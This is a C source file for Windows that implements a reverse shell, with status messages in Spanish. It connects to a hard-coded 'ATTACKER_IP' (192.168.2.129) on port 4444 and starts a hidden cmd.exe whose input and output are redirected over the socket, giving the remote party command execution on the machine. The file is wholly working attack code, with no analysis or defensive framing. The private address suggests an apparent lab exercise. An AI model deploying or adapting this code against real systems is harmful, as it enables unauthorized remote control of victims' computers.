#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <ws2tcpip.h>

#define ATTACKER_IP "192.168.2.129"
#define ATTACKER_PORT 4444

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    printf("Iniciando reverse shell...\n");
    
    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("Error inicializando Winsock\n");
        return 1;
    }
    printf("Winsock inicializado correctamente\n");

    // Create socket
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        printf("Error creando socket: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    printf("Socket creado correctamente\n");

    // Set up server address
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(ATTACKER_IP);
    server.sin_port = htons(ATTACKER_PORT);

    printf("Intentando conectar a %s:%d\n", ATTACKER_IP, ATTACKER_PORT);
    
    // Connect to attacker
    if (WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        printf("Error conectando: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return 1;
    }
    printf("Conectado exitosamente al servidor\n");

    // Resto del código...
    // Set up process information
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    // Start cmd.exe
    if (CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        printf("Proceso cmd.exe iniciado\n");
        
        // Wait for the process to exit
        WaitForSingleObject(pi.hProcess, INFINITE);
        
        // Clean up
        closesocket(sock);
        WSACleanup();
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("Error iniciando cmd.exe: %d\n", GetLastError());
    }

    return 0;
}